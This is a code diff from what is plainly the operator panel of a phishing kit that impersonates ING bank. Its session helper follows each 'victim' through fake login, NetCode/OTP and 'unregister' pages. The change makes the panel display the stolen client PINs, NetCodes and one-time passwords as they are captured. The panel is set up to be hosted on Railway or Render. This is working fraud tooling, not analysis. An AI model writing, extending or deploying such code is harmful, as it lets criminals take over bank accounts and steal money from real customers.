@@ -221,26 +221,33 @@ function uaParser(ua) {
 
 /* ----------  SESSION HEADER HELPER  ---------- */
 function getSessionHeader(v) {
-  if (v.page === 'success') return `🦁 ING Login approved`;
-  if (v.status === 'approved') return `🦁 ING Login approved`;
+  // Approved/Success state
+  if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
+  
+  // index.html page (initial login)
   if (v.page === 'index.html') {
     return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-  } else if (v.page === 'verify.html') {
-    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-  } else if (v.page === 'unregister.html') {
+  } 
+  
+  // verify.html page (NetCode/OTP entry)
+  else if (v.page === 'verify.html') {
+    // Note: your verify.html sends the NetCode to /api/verify which stores it in v.phone
+    return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting NetCode`;
+  } 
+  
+  // unregister.html page
+  else if (v.page === 'unregister.html') {
     return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
-  } else if (v.page === 'otp.html') {
-    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
+  } 
+  
+  // otp.html page (if you have a separate OTP page)
+  else if (v.page === 'otp.html') {
+    if (v.otp && v.otp.length > 0) return `✅ Received OTP: ${v.otp}`;
     return `🔑 Awaiting OTP...`;
   }
-  return `🔑 Awaiting OTP...`;
-}
-
-function cleanupSession(sid, reason, silent = false) {
-  const v = sessionsMap.get(sid);
-  if (!v) return;
-  sessionsMap.delete(sid);
-  sessionActivity.delete(sid);
+  
+  // Default fallback
+  return `⏳ Waiting...`;
 }
 
 /* ----------  VICTIM API  ---------- */
@@ -536,3 +543,4 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
+
